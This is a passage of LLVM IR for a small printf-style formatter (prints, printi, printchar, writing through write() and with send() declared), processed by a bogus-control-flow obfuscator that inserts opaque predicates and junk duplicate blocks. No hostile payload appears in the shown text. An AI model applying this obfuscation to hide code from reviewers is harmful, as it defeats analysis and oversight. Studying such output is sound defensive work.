  %625 = icmp eq i32 %624, 115
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %274
  %626 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %627 = load i8*, i8** %626, align 8
  %628 = getelementptr i8, i8* %627, i32 %272
  %629 = bitcast i8* %628 to i32*
  %_ = sub i32 %272, 8
  %gen = mul i32 %_, 8
  %_35 = sub i32 0, %272
  %gen36 = add i32 %_35, 8
  %_37 = shl i32 %272, 8
  %630 = add i32 %272, 8
  store i32 %630, i32* %271, align 8
  br label %originalBB34

originalBB41alteredBB:                            ; preds = %originalBB41, %309
  %631 = load i8*, i8** %13, align 8
  %632 = load i8, i8* %631, align 1
  %633 = zext i8 %632 to i32
  %634 = icmp eq i32 %633, 120
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %336
  %635 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 3
  %636 = load i8*, i8** %635, align 8
  %637 = getelementptr i8, i8* %636, i32 %334
  %638 = bitcast i8* %637 to i32*
  %_46 = sub i32 0, %334
  %gen47 = add i32 %_46, 8
  %_48 = sub i32 %334, 8
  %gen49 = mul i32 %_48, 8
  %_50 = sub i32 %334, 8
  %gen51 = mul i32 %_50, 8
  %_52 = shl i32 %334, 8
  %_53 = sub i32 0, %334
  %gen54 = add i32 %_53, 8
  %_55 = shl i32 %334, 8
  %639 = add i32 %334, 8
  store i32 %639, i32* %333, align 8
  br label %originalBB45

originalBB59alteredBB:                            ; preds = %originalBB59, %358
  %640 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 2
  %641 = load i8*, i8** %640, align 8
  %642 = bitcast i8* %641 to i32*
  %643 = getelementptr i8, i8* %641, i32 8
  store i8* %643, i8** %640, align 8
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %409
  %644 = load i32, i32* %410, align 4
  %645 = load i32, i32* %15, align 4
  %646 = load i32, i32* %16, align 4
  %647 = call i32 @printi(i8** %393, i32 %644, i32 16, i32 0, i32 %645, i32 %646, i32 65)
  %648 = load i32, i32* %17, align 4
  %_64 = sub i32 %648, %647
  %gen65 = mul i32 %_64, %647
  %_66 = shl i32 %648, %647
  %649 = add nsw i32 %648, %647
  store i32 %649, i32* %17, align 4
  br label %originalBB63

originalBB70alteredBB:                            ; preds = %originalBB70, %433
  %650 = load i8*, i8** %13, align 8
  %651 = load i8, i8* %650, align 1
  %652 = zext i8 %651 to i32
  %653 = icmp eq i32 %652, 117
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %479
  %654 = load i8*, i8** %13, align 8
  %655 = load i8, i8* %654, align 1
  %656 = zext i8 %655 to i32
  %657 = icmp eq i32 %656, 99
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %511
  %658 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %501, i32 0, i32 2
  %659 = load i8*, i8** %658, align 8
  %660 = bitcast i8* %659 to i32*
  %661 = getelementptr i8, i8* %659, i32 8
  store i8* %661, i8** %658, align 8
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %546
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %574
  %662 = load i8**, i8*** %12, align 8
  %663 = icmp ne i8** %662, null
  br label %originalBB86
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %91, label %46

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @x.15
  %48 = load i32, i32* @y.16
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %46
  %55 = load i32, i32* @x.15
  %56 = load i32, i32* @y.16
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %63

; <label>:63:                                     ; preds = %87, %originalBBpart2
  %64 = load i32, i32* @x.15
  %65 = load i32, i32* @y.16
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = load i32, i32* %7, align 4
  %73 = icmp sgt i32 %72, 0
  %74 = load i32, i32* @x.15
  %75 = load i32, i32* @y.16
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %73, label %82, label %90

; <label>:82:                                     ; preds = %originalBBpart24
  %83 = load i8**, i8*** %5, align 8
  %84 = load i32, i32* %10, align 4
  call void @printchar(i8** %83, i32 %84)
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %9, align 4
  br label %87

; <label>:87:                                     ; preds = %82
  %88 = load i32, i32* %7, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %7, align 4
  br label %63

; <label>:90:                                     ; preds = %originalBBpart24
  br label %91

; <label>:91:                                     ; preds = %90, %42
  br label %92

; <label>:92:                                     ; preds = %originalBBpart28, %91
  %93 = load i8*, i8** %6, align 8
  %94 = load i8, i8* %93, align 1
  %95 = icmp ne i8 %94, 0
  br i1 %95, label %96, label %122

; <label>:96:                                     ; preds = %92
  %97 = load i8**, i8*** %5, align 8
  %98 = load i8*, i8** %6, align 8
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i32
  call void @printchar(i8** %97, i32 %100)
  %101 = load i32, i32* %9, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %9, align 4
  br label %103

; <label>:103:                                    ; preds = %96
  %104 = load i32, i32* @x.15
  %105 = load i32, i32* @y.16
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  %112 = load i8*, i8** %6, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %6, align 8
  %114 = load i32, i32* @x.15
  %115 = load i32, i32* @y.16
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %92

; <label>:122:                                    ; preds = %92
  br label %123

; <label>:123:                                    ; preds = %131, %122
  %124 = load i32, i32* %7, align 4
  %125 = icmp sgt i32 %124, 0
  br i1 %125, label %126, label %134

; <label>:126:                                    ; preds = %123
  %127 = load i8**, i8*** %5, align 8
  %128 = load i32, i32* %10, align 4
  call void @printchar(i8** %127, i32 %128)
  %129 = load i32, i32* %9, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %9, align 4
  br label %131

; <label>:131:                                    ; preds = %126
  %132 = load i32, i32* %7, align 4
  %133 = add nsw i32 %132, -1
  store i32 %133, i32* %7, align 4
  br label %123

; <label>:134:                                    ; preds = %123
  %135 = load i32, i32* %9, align 4
  ret i32 %135

originalBBalteredBB:                              ; preds = %originalBB, %46
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %136 = load i32, i32* %7, align 4
  %137 = icmp sgt i32 %136, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  %138 = load i8*, i8** %6, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %6, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.17
  %9 = load i32, i32* @y.18
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.17
  %34 = load i32, i32* @y.18
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %65

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.17
  %43 = load i32, i32* @y.18
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %50, align 1
  %51 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %51, align 1
  %52 = load i8**, i8*** %17, align 8
  %53 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %22, align 4
  %56 = call i32 @prints(i8** %52, i8* %53, i32 %54, i32 %55)
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* @x.17
  %58 = load i32, i32* @y.18
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %230

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.17
  %67 = load i32, i32* @y.18
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i32, i32* %20, align 4
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.17
  %77 = load i32, i32* @y.18
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %109

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* @x.17
  %86 = load i32, i32* @y.18
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %93 = load i32, i32* %19, align 4
  %94 = icmp eq i32 %93, 10
  %95 = load i32, i32* @x.17
  %96 = load i32, i32* @y.18
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %94, label %103, label %109

; <label>:103:                                    ; preds = %originalBBpart212
  %104 = load i32, i32* %18, align 4
  %105 = icmp slt i32 %104, 0
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %103
  store i32 1, i32* %27, align 4
  %107 = load i32, i32* %18, align 4
  %108 = sub nsw i32 0, %107
  store i32 %108, i32* %29, align 4
  br label %109

; <label>:109:                                    ; preds = %106, %103, %originalBBpart212, %originalBBpart28
  %110 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %111 = getelementptr inbounds i8, i8* %110, i64 12
  %112 = getelementptr inbounds i8, i8* %111, i64 -1
  store i8* %112, i8** %25, align 8
  %113 = load i8*, i8** %25, align 8
  store i8 0, i8* %113, align 1
  br label %114

; <label>:114:                                    ; preds = %145, %109
  %115 = load i32, i32* %29, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %154

; <label>:117:                                    ; preds = %114
  %118 = load i32, i32* @x.17
  %119 = load i32, i32* @y.18
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %117
  %126 = load i32, i32* %29, align 4
  %127 = load i32, i32* %19, align 4
  %128 = urem i32 %126, %127
  store i32 %128, i32* %26, align 4
  %129 = load i32, i32* %26, align 4
  %130 = icmp sge i32 %129, 10
  %131 = load i32, i32* @x.17
  %132 = load i32, i32* @y.18
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %139, label %145

; <label>:139:                                    ; preds = %originalBBpart216
  %140 = load i32, i32* %23, align 4
  %141 = sub nsw i32 %140, 48
  %142 = sub nsw i32 %141, 10
  %143 = load i32, i32* %26, align 4
  %144 = add nsw i32 %143, %142
  store i32 %144, i32* %26, align 4
  br label %145

; <label>:145:                                    ; preds = %139, %originalBBpart216
  %146 = load i32, i32* %26, align 4
  %147 = add nsw i32 %146, 48
  %148 = trunc i32 %147 to i8
  %149 = load i8*, i8** %25, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 -1
  store i8* %150, i8** %25, align 8
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %19, align 4
  %152 = load i32, i32* %29, align 4
  %153 = udiv i32 %152, %151
  store i32 %153, i32* %29, align 4
  br label %114

; <label>:154:                                    ; preds = %114
  %155 = load i32, i32* @x.17
  %156 = load i32, i32* @y.18
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %154
  %163 = load i32, i32* %27, align 4
  %164 = icmp ne i32 %163, 0
  %165 = load i32, i32* @x.17
  %166 = load i32, i32* @y.18
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %164, label %173, label %222

; <label>:173:                                    ; preds = %originalBBpart220
  %174 = load i32, i32* %21, align 4
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %186

; <label>:176:                                    ; preds = %173
  %177 = load i32, i32* %22, align 4
  %178 = and i32 %177, 2
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %186

; <label>:180:                                    ; preds = %176
  %181 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %181, i32 45)
  %182 = load i32, i32* %28, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %28, align 4
  %184 = load i32, i32* %21, align 4
  %185 = add nsw i32 %184, -1
  store i32 %185, i32* %21, align 4
  br label %205

; <label>:186:                                    ; preds = %176, %173
  %187 = load i32, i32* @x.17
  %188 = load i32, i32* @y.18
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %186
  %195 = load i8*, i8** %25, align 8
  %196 = getelementptr inbounds i8, i8* %195, i32 -1
  store i8* %196, i8** %25, align 8
  store i8 45, i8* %196, align 1
  %197 = load i32, i32* @x.17
  %198 = load i32, i32* @y.18
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %205

; <label>:205:                                    ; preds = %originalBBpart224, %180
  %206 = load i32, i32* @x.17
  %207 = load i32, i32* @y.18
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %205
  %214 = load i32, i32* @x.17
  %215 = load i32, i32* @y.18
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %222

; <label>:222:                                    ; preds = %originalBBpart228, %originalBBpart220
  %223 = load i32, i32* %28, align 4
  %224 = load i8**, i8*** %17, align 8
  %225 = load i8*, i8** %25, align 8
  %226 = load i32, i32* %21, align 4
  %227 = load i32, i32* %22, align 4
  %228 = call i32 @prints(i8** %224, i8* %225, i32 %226, i32 %227)
  %229 = add nsw i32 %223, %228
  store i32 %229, i32* %16, align 4
  br label %230

; <label>:230:                                    ; preds = %222, %originalBBpart24
  %231 = load i32, i32* @x.17
  %232 = load i32, i32* @y.18
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %230
  %239 = load i32, i32* %16, align 4
  %240 = load i32, i32* @x.17
  %241 = load i32, i32* @y.18
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %239

originalBBalteredBB:                              ; preds = %originalBB, %7
  %248 = alloca i32, align 4
  %249 = alloca i8**, align 8
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i32, align 4
  %255 = alloca i32, align 4
  %256 = alloca [12 x i8], align 1
  %257 = alloca i8*, align 8
  %258 = alloca i32, align 4
  %259 = alloca i32, align 4
  %260 = alloca i32, align 4
  %261 = alloca i32, align 4
  store i8** %0, i8*** %249, align 8
  store i32 %1, i32* %250, align 4
  store i32 %2, i32* %251, align 4
  store i32 %3, i32* %252, align 4
  store i32 %4, i32* %253, align 4
  store i32 %5, i32* %254, align 4
  store i32 %6, i32* %255, align 4
  store i32 0, i32* %259, align 4
  store i32 0, i32* %260, align 4
  %262 = load i32, i32* %250, align 4
  store i32 %262, i32* %261, align 4
  %263 = load i32, i32* %250, align 4
  %264 = icmp eq i32 %263, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %265 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %265, align 1
  %266 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %266, align 1
  %267 = load i8**, i8*** %17, align 8
  %268 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %269 = load i32, i32* %21, align 4
  %270 = load i32, i32* %22, align 4
  %271 = call i32 @prints(i8** %267, i8* %268, i32 %269, i32 %270)
  store i32 %271, i32* %16, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %272 = load i32, i32* %20, align 4
  %273 = icmp ne i32 %272, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  %274 = load i32, i32* %19, align 4
  %275 = icmp eq i32 %274, 10
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %117
  %276 = load i32, i32* %29, align 4
  %277 = load i32, i32* %19, align 4
  %_ = sub i32 0, %276
  %gen = add i32 %_, %277
  %278 = urem i32 %276, %277
  store i32 %278, i32* %26, align 4
  %279 = load i32, i32* %26, align 4
  %280 = icmp sge i32 %279, 10
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %154
  %281 = load i32, i32* %27, align 4
  %282 = icmp ne i32 %281, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %186
  %283 = load i8*, i8** %25, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 -1
  store i8* %284, i8** %25, align 8
  store i8 45, i8* %284, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %205
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %230
  %285 = load i32, i32* %16, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %31

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %12, align 4
  %25 = trunc i32 %24 to i8
  %26 = load i8**, i8*** %11, align 8
  %27 = load i8*, i8** %26, align 8
  store i8 %25, i8* %27, align 1
  %28 = load i8**, i8*** %11, align 8
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %28, align 8
  br label %50

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.19
  %33 = load i32, i32* @y.20
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = bitcast i32* %12 to i8*
  %41 = call i64 @write(i32 1, i8* %40, i64 1)
  %42 = load i32, i32* @x.19
  %43 = load i32, i32* @y.20
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %23
  %51 = load i32, i32* @x.19
  %52 = load i32, i32* @y.20
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %59 = load i32, i32* @x.19
  %60 = load i32, i32* @y.20
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %67 = alloca i8**, align 8
  %68 = alloca i32, align 4
  store i8** %0, i8*** %67, align 8
  store i32 %1, i32* %68, align 4
  %69 = load i8**, i8*** %67, align 8
  %70 = icmp ne i8** %69, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %71 = bitcast i32* %12 to i8*
  %72 = call i64 @write(i32 1, i8* %71, i64 1)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  br label %originalBB6
}

declare i64 @write(i32, i8*, i64) #2

